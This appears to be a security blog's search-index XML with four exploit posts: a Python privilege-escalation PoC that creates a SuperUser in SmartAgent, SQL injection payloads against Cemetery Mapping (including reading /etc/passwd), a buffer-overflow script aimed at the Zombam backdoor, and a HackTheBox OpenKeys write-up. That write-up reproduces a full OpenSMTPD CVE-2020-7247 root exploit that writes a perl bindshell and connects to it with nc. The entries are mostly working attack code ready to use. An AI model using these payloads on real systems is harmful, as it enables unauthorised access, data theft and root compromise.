<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SmartAgent 3.1.0 Privilege Escalation</title>
    <link href="/2021/01/13/SmartAgent-3-1-0-Privilege-Escalation/"/>
    <url>/2021/01/13/SmartAgent-3-1-0-Privilege-Escalation/</url>
    
    <content type="html"><![CDATA[<h3 id="SmartAgent-3-1-0-Privilege-Escalation"><a href="#SmartAgent-3-1-0-Privilege-Escalation" class="headerlink" title="SmartAgent 3.1.0 Privilege Escalation"></a>SmartAgent 3.1.0 Privilege Escalation</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">A Low grade user like ViewOnly can create an account with SuperUser  </span><br><span class="hljs-string">permission.  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">Steps To Reproduce:  </span><br><span class="hljs-string">1. Create a user with ViewOnly  </span><br><span class="hljs-string">2. Visit https://demo.localhost.com/#/CampaignManager/users  </span><br><span class="hljs-string">3. Now you will be able to create an account with SuperUser.  </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment">#Python Exploit [Replace With Your Authorization Code]  </span><br>  <br><span class="hljs-keyword">import</span> requests  <br>  <br>session = requests.Session()  <br>  <br>rawBody = <span class="hljs-string">&quot;&#123;\&quot;username\&quot;:\&quot;orion@hridoy.com  </span><br><span class="hljs-string">\&quot;,\&quot;password\&quot;:\&quot;Orionhridoy69\&quot;,\&quot;appName\&quot;:\&quot;AppEngage\&quot;,\&quot;role\&quot;:\&quot;Admin\&quot;,\&quot;android\&quot;:\&quot;1\&quot;,\&quot;ios\&quot;:\&quot;0\&quot;,\&quot;kai\&quot;:\&quot;0\&quot;&#125;&quot;</span>  <br>headers = &#123;<span class="hljs-string">&quot;Authorization&quot;</span>:<span class="hljs-string">&quot;id=orion@gmail.com,engageToken=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJvcmlvbkBnbWFpbC5jb20iLCJyb2xlcyI6WyJWaWV3T25seSJdLCJhcHBOYW1lIjoiQXBwRW5nYWdlIiwicGxhdGZvcm0iOiJBTkRST0lEIiwiaXNzIjoiRU5BR0FHRSIsImlhdCI6MTYxMDM3NDEyMCwiZXhwIjoxNjExMjM4MTIwfQ.SbnZaRe3-2GOFOm7QDzvIBQCKBAK_GV-wKsMoH4GGChyjUFe2Ij4LiVl5rXsWRfTqNnJXj9fFxYTzkD2-kXlAQ&quot;</span>,<span class="hljs-string">&quot;Accept&quot;</span>:<span class="hljs-string">&quot;application/json,  </span><br><span class="hljs-string">text/plain, */*&quot;</span>,<span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64;  </span><br><span class="hljs-string">rv:52.0) Gecko/20100101  </span><br><span class="hljs-string">Firefox/52.0&quot;</span>,<span class="hljs-string">&quot;Referer&quot;</span>:<span class="hljs-string">&quot;https://demo.localhost.com/&quot;</span>,<span class="hljs-string">&quot;Connection&quot;</span>:<span class="hljs-string">&quot;close&quot;</span>,<span class="hljs-string">&quot;Accept-Language&quot;</span>:<span class="hljs-string">&quot;en-US,en;q=0.5&quot;</span>,<span class="hljs-string">&quot;Accept-Encoding&quot;</span>:<span class="hljs-string">&quot;gzip,  </span><br><span class="hljs-string">deflate&quot;</span>,<span class="hljs-string">&quot;DNT&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/json&quot;</span>&#125;  <br>response = session.post(<span class="hljs-string">&quot;https://demo.localhost.com/api/createUser&quot;</span>,  <br>data=rawBody, headers=headers)  <br>  <br>print(<span class="hljs-string">&quot;User Created With\nUser: orion@hridoy.com\nPass: Orionhridoy69&quot;</span>)<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>poc</tag>
      
      <tag>Privilege Escalation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cemetery Mapping And Information System 1.0 SQL Injection</title>
    <link href="/2021/01/13/Cemetery-Mapping-And-Information-System-1-0-SQL-Injection/"/>
    <url>/2021/01/13/Cemetery-Mapping-And-Information-System-1-0-SQL-Injection/</url>
    
    <content type="html"><![CDATA[<h3 id="Cemetery-Mapping-And-Information-System-1-0-SQL-Injection"><a href="#Cemetery-Mapping-And-Information-System-1-0-SQL-Injection" class="headerlink" title="Cemetery Mapping And Information System 1.0 SQL Injection"></a>Cemetery Mapping And Information System 1.0 SQL Injection</h3><p>SQL Injection is a type of an injection attack that makes it possible to execute malicious SQL statements. Due to unsanitized user input, the attacker can retrieve the entire SQL database in this case.  </p><p>Explanation:  </p><p>The function “person.php” takes user input through the search bar at line 45:  </p><p>“$_POST[‘search’]”  </p><p>and uses it without any sanitization for the following SQL statement (line 46-49):  </p><p>$sql = “SELECT * FROM tblpeople WHERE FNAME LIKE ‘%”.$search.”%’”;<br>$mydb-&gt;setQuery($sql);<br>$cur = $mydb-&gt;executeQuery();<br>$numrows = $mydb-&gt;num_rows($cur);//get the number of count  </p><p>A single quote (‘) at the search bar under <a href="http://localhost/CemeteryMapping/index.php?q=person">http://localhost/CemeteryMapping/index.php?q=person</a> will result in SQL synthax errors.  </p><p>Proof of Concept:  </p><p>Since the php code lacks of sanitization of the user input, multiple SQL injection queries can be found.  </p><ol><li>Boolean-based SQL injection  </li></ol><p>POST request the page /CemeteryMapping/index.php?q=person and use as payload: ‘ or 1=1 –  </p><p>search=’ or 1=1 –  </p><ol start="2"><li>Union-based SQL injection  </li></ol><p>To retrieve sensitive files like /etc/passwd, use the following payload at the search bar (POST request <a href="http://localhost/CemeteryMapping/index.php?q=person">http://localhost/CemeteryMapping/index.php?q=person</a>):  </p><p>search=’ UNION SELECT NULL,load_file(‘/etc/passwd’),NULL,NULL,NULL,NULL,NULL– -  </p><p>If you want to enumerate the target system further, replace “load_file(‘/etc/passwd’)” with one of the following MySQL commands:  </p><p>@@hostname : Current Hostname  </p><p>@@tmpdir : Temp Directory  </p><p>@@datadir : Data Directory  </p><p>@@version : Version of DB  </p><p>@@basedir : Base Directory  </p><p>user() : Current User  </p><p>database() : Current Database  </p><p>version() : Version  </p><p>schema() : current Database  </p><p>UUID() : System UUID key  </p><p>current_user() : Current User  </p><p>current_user : Current User  </p><p>system_user() : Current System user  </p><p>session_user() : Session user  </p><p>@@GLOBAL.have_symlink : Check if Symlink is enabled or disabled  </p><p>@@GLOBAL.have_ssl : Check if it have SSL or not  </p><ol start="3"><li>Time-based SQL injection  </li></ol><p>For time-based SQL injection, use the payload: ‘ AND (SELECT 2634 FROM (SELECT(SLEEP(5)))muaN)– -  </p>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>poc</tag>
      
      <tag>SQL Injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Exploit Backdoor.Win32.Zombam.a Remote Stack Buffer Overflow</title>
    <link href="/2021/01/13/Exploit-Backdoor-Win32-Zombam-a-Remote-Stack-Buffer-Overflow/"/>
    <url>/2021/01/13/Exploit-Backdoor-Win32-Zombam-a-Remote-Stack-Buffer-Overflow/</url>
    
    <content type="html"><![CDATA[<h3 id="Exploit-Backdoor-Win32-Zombam-a-Remote-Stack-Buffer-Overflow"><a href="#Exploit-Backdoor-Win32-Zombam-a-Remote-Stack-Buffer-Overflow" class="headerlink" title="Exploit Backdoor.Win32.Zombam.a Remote Stack Buffer Overflow"></a>Exploit Backdoor.Win32.Zombam.a Remote Stack Buffer Overflow</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Description: The malware listens on TCP port 80, sending an </span><br><span class="hljs-string">HTTP GET request with 300 or more bytes will trigger buffer</span><br><span class="hljs-string">overflow overwriting EIP.  Type: PE32 </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *  <br>  <br>MALWARE_HOST=<span class="hljs-string">&quot;x.x.x.x&quot;</span>  <br>PORT=<span class="hljs-number">80</span>  <br>  <br>PACKET=<span class="hljs-string">&quot;GET /&quot;</span>+<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">300</span>+<span class="hljs-string">&quot;HTTP/1.0\r\nHost: &quot;</span>+MALWARE_HOST  <br>  <br>s=socket(AF_INET, SOCK_STREAM)  <br>s.connect((MALWARE_HOST, PORT))  <br>s.send(PACKET)  <br>s.close()  <br>print(<span class="hljs-string">&quot;Backdoor.Win32.Zombam.a / Remote Stack Buffer Overflow&quot;</span>)  <br>print(<span class="hljs-string">&quot;MD5: 6c5081e9b65a52963b0b1ae612ef7eb4&quot;</span>)  <br>print(<span class="hljs-string">&quot;By Malvuln&quot;</span>)  <br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Exploit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Remote Stack Buffer Overflow</tag>
      
      <tag>poc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox-OpenKeys WriteUp</title>
    <link href="/2021/01/12/HackTheBox-OpenKeys/"/>
    <url>/2021/01/12/HackTheBox-OpenKeys/</url>
    
    <content type="html"><![CDATA[<h3 id="HackTheBox-OpenKeys-WriteUp"><a href="#HackTheBox-OpenKeys-WriteUp" class="headerlink" title="HackTheBox-OpenKeys WriteUp"></a>HackTheBox-OpenKeys WriteUp</h3><h4 id="INT"><a href="#INT" class="headerlink" title="INT"></a>INT</h4><h6 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h6><div class="hljs code-wrapper"><pre><code>&gt; IP: 10.10.10.199&gt; port:22&gt; 22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)&gt; port:80&gt; OpenKeyS - Retrieve your OpenSSH Keys #maybe keyword&gt; OS:FreeBsd</code></pre></div><h4 id="Port-80-Enum-FootHold"><a href="#Port-80-Enum-FootHold" class="headerlink" title="Port 80 Enum FootHold"></a>Port 80 Enum FootHold</h4><div class="hljs code-wrapper"><pre><code>&gt; http://10.10.10.199/includes/auth.php.swp&gt; jennifer&gt; jenniferopenkeys.htb/var/www/htdocs/includes/auth.php&gt; OpenBSD authentication login POC (can use)</code></pre></div><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">POST /index.php HTTP/1.1<br>Host: 10.10.10.199<br>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 41<br>Origin: http://10.10.10.199<br>Connection: close<br>Referer: http://10.10.10.199/index.php<br>Cookie: PHPSESSID=8hivfuib14nvufhqeejtqigfqf;username=jennifer<br>Upgrade-Insecure-Requests: 1<br><br>username=&quot;-schallenge&quot;&amp;password=&quot;-schallenge&quot;<br></code></pre></div></td></tr></table></figure><div class="hljs code-wrapper"><pre><code>&gt; Get SSH key</code></pre></div><h4 id="User"><a href="#User" class="headerlink" title="User"></a>User</h4><div class="hljs code-wrapper"><pre><code>&gt; ssh -i ssh.key jennifer@10.10.10.199</code></pre></div><h4 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h4><div class="hljs code-wrapper"><pre><code>&gt; CVE-2020-7247</code></pre></div><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br><span class="hljs-meta">#</span><span class="bash"> root66 - OpenBSD 6.6 OpenSMTPD 6.6 <span class="hljs-built_in">local</span> root exploit <span class="hljs-keyword">for</span> CVE-2020-7247</span><br><span class="hljs-meta">#</span><span class="bash"> starts a perl bindshell on port 1337 with root privileges</span><br><span class="hljs-meta">#</span><br><span class="bash"><span class="hljs-comment"># Code mostly stolen from Qualys PoCs:</span></span><br><span class="hljs-meta">#</span><span class="bash"> - https://www.openwall.com/lists/oss-security/2020/01/28/3</span><br><span class="hljs-meta">#</span><span class="bash"> - https://blog.qualys.com/laws-of-vulnerabilities/2020/01/29/openbsd-opensmtpd-remote-code-execution-vulnerability-cve-2020-7247</span><br><span class="hljs-meta">#</span><span class="bash"> - https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt</span><br><span class="hljs-meta">#</span><span class="bash"> ---</span><br><span class="hljs-meta">#</span><span class="bash"> openbsd-6-6-x64$ ./root66</span><br><span class="hljs-meta">#</span><span class="bash"> OpenBSD 6.6 OpenSMTPD 6.6 <span class="hljs-built_in">local</span> root exploit (CVE-2020-7247)</span><br><span class="hljs-meta">#</span><span class="bash"> [*] id: uid=1001(<span class="hljs-built_in">test</span>) gid=1001(<span class="hljs-built_in">test</span>) groups=1001(<span class="hljs-built_in">test</span>)</span><br><span class="hljs-meta">#</span><span class="bash"> [*] checking system ...</span><br><span class="hljs-meta">#</span><span class="bash"> [*] directory /tmp/.payload is writable</span><br><span class="hljs-meta">#</span><span class="bash"> [*] 019_smtpd_exec patch has not been installed</span><br><span class="hljs-meta">#</span><span class="bash"> [*] writing payload to /tmp/.payload ...</span><br><span class="hljs-meta">#</span><span class="bash"> [*] executing /tmp/.payload ...</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">220 openbsd-6-6-x64.localdomain ESMTP OpenSMTPD</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; EHLO localhost</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-openbsd-6-6-x64.localdomain Hello localhost [local], pleased to meet you</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-8BITMIME</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-ENHANCEDSTATUSCODES</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250-SIZE 36700160</span></span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 HELP</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; MAIL FROM:&lt;;/tmp/.payload;<span class="hljs-comment">#@&gt;</span></span>  <br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 2.0.0 Ok</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; RCPT TO:&lt;<span class="hljs-built_in">test</span>@openbsd-6-6-x64.localdomain&gt;</span> <br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 2.1.5 Destination address valid: Recipient ok</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; DATA</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">354 Enter mail, end with &quot;.&quot; on a line by itself</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; .</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">250 2.0.0 9493d192 Message accepted for delivery</span></span><br><span class="hljs-meta">#</span><span class="bash"> &gt;&gt;&gt; QUIT</span><br><span class="hljs-meta">#</span><span class="bash"> &lt;&lt;&lt; <span class="hljs-string">221 2.0.0 Bye</span></span><br><span class="hljs-meta">#</span><span class="bash"> [*] cleaning up /tmp/.payload ...</span><br><span class="hljs-meta">#</span><span class="bash"> [*] connecting to 127.0.0.1:1337 ...</span><br><span class="hljs-meta">#</span><span class="bash"> Connection to 127.0.0.1 1337 port [tcp/*] succeeded!</span><br><span class="hljs-meta">#</span><span class="bash"> id</span><br><span class="hljs-meta">#</span><span class="bash"> uid=0(root) gid=0(wheel) groups=0(wheel)</span><br><span class="hljs-meta">#</span><span class="bash"> uname -a</span><br><span class="hljs-meta">#</span><span class="bash"> OpenBSD openbsd-6-6-x64.localdomain 6.6 GENERIC<span class="hljs-comment">#353 amd64</span></span><br><span class="hljs-meta">#</span><span class="bash"> ---</span><br><span class="hljs-meta">#</span><span class="bash"> 2020-01-31 - &lt;bcoles@gmail.com&gt;</span><br><span class="hljs-meta">#</span><span class="bash"> https://github.com/bcoles/local-exploits/tree/master/CVE-2020-7247</span><br><br>payload=&quot;/tmp/.payload&quot;<br><br>/bin/echo &quot;OpenBSD 6.6 OpenSMTPD 6.6 local root exploit (CVE-2020-7247)&quot;<br><br>/bin/echo &quot;[*] id: `id`&quot;<br><br>/bin/echo &quot;[*] checking system ...&quot;<br><br>if [ -w `dirname $payload` ]; then<br>  /bin/echo &quot;[*] directory $payload is writable&quot;<br>else<br>  /bin/echo &quot;[-] directory $payload is not writable&quot;<br>  exit 1<br>fi<br><br>if syspatch -l | grep -q 019_smtpd_exec ; then<br>  /bin/echo &quot;[-] 019_smtpd_exec patch has been installed&quot;<br>  exit 1<br>else<br>  /bin/echo &quot;[*] 019_smtpd_exec patch has not been installed&quot;<br>fi<br><br>/bin/echo &quot;[*] writing payload to $payload ...&quot;<br>cat &gt; $payload &lt;&lt; &quot;EOF&quot;<br><span class="hljs-meta">#</span><span class="bash">!/bin/sh</span><br>perl -MIO -e &#x27;$p=fork();exit,if$p;foreach my $key(keys %ENV)&#123;if($ENV&#123;$key&#125;=~/(.*)/)&#123;$ENV&#123;$key&#125;=$1;&#125;&#125;$c=new IO::Socket::INET(LocalPort,1337,Reuse,1,Listen)-&gt;accept;$~-&gt;fdopen($c,w);STDIN-&gt;fdopen($c,r);while(&lt;&gt;)&#123;if($_=~ /(.*)/)&#123;system $1;&#125;&#125;;&#x27;<br>EOF<br>/bin/chmod +x $payload<br><br>/bin/echo &quot;[*] executing $payload ...&quot;<br>/bin/echo | /usr/sbin/sendmail -v -f &quot;&lt;;$payload;#@&gt;&quot; `whoami`<br><br>/bin/sleep 1<br><br>/bin/echo &quot;[*] cleaning up $payload ...&quot;<br>/bin/rm $payload<br><br>/bin/echo &quot;[*] connecting to 127.0.0.1:1337 ...&quot;<br>nc -v 127.0.0.1 1337<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Hack The Box</tag>
      
      <tag>CVE-2020-7247</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
